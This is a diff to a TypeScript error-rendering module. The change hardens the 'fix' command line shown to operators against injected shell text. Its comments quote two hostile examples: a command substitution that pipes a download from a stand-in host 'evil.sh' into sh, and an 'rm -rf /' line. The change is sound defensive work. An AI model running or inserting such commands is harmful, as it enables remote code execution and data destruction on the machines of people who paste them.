@@ -2,7 +2,14 @@
 // document and the three lines the terminal and the overlay print. Split off `error-map.ts` at the
 // 500-line ceiling — that file answers "what status is this code", one closed table, and this one
 // answers "what does a reader see", which is three audiences and one opacity rule.
-import { ERROR_DOCS_URL, renderCauseValue, singleLine, stringField } from '@ultimat3/core';
+import {
+  ERROR_DOCS_URL,
+  FRAMEWORK_CODE,
+  isUltimateError,
+  renderCauseValue,
+  singleLine,
+  stringField,
+} from '@ultimat3/core';
 import type { ValidationIssue } from '@ultimat3/schema';
 import { declaredStatusFor, statusFor } from './error-map';
 import { HTTP_ERROR_TITLES } from './errors';
@@ -64,7 +71,23 @@ export const factsOf = (error: unknown): ErrorFacts => {
     // `x logs tail` is in `PLANNED_COMMANDS` — it exits `X_NOT_IMPLEMENTED`. A fix line naming a
     // command that throws is axiom 4 inverted: the one instruction the reader is given fails.
     // `x errors explain` ships, and it is the command that answers "what is this code".
-    fix: str(error, 'fix') ?? `x errors explain ${code} --json   # then fix the throwing call site`,
+    // `FRAMEWORK_CODE`, never `startsWith('X_')`: `code` is a string field off a value this
+    // package did not build, and this line is a COMMAND a reader pastes — `x errors explain
+    // X_$(curl evil.sh|sh) --json` substitutes before `x` is reached. A code that is not one
+    // answers nothing anyway, so the listing is the honest command. Same gate, same reason, as
+    // `@ultimat3/mcp`'s `server.ts`.
+    // BRANDED, never merely "has a `fix` string": `factsOf` normalises a worker message, a
+    // WebSocket frame and any app object, so a foreign `fix` is remote text landing in the line an
+    // operator is told to paste — `rm -rf / # x errors explain` renders as authoritative as the
+    // framework's own. An `UltimateError` built its `fix` in this process, through
+    // `renderFixShellArg` and this tree's gate; nothing else has. A framework error that crossed a
+    // wire and lost its brand falls to the generated line below, which is honest rather than a
+    // command it did not author.
+    fix:
+      (isUltimateError(error) ? str(error, 'fix') : undefined) ??
+      (FRAMEWORK_CODE.test(code)
+        ? `x errors explain ${code} --json   # then fix the throwing call site`
+        : 'x errors list --json   # then fix the throwing call site'),
     // Core's one constant, never a per-code URL: `wiki/` is the only public documentation surface
     // and a code lives there in a table row, which has no anchor. An `UltimateError` already
     // resolved this at construction, so the fallback only fires for a throwable the framework did
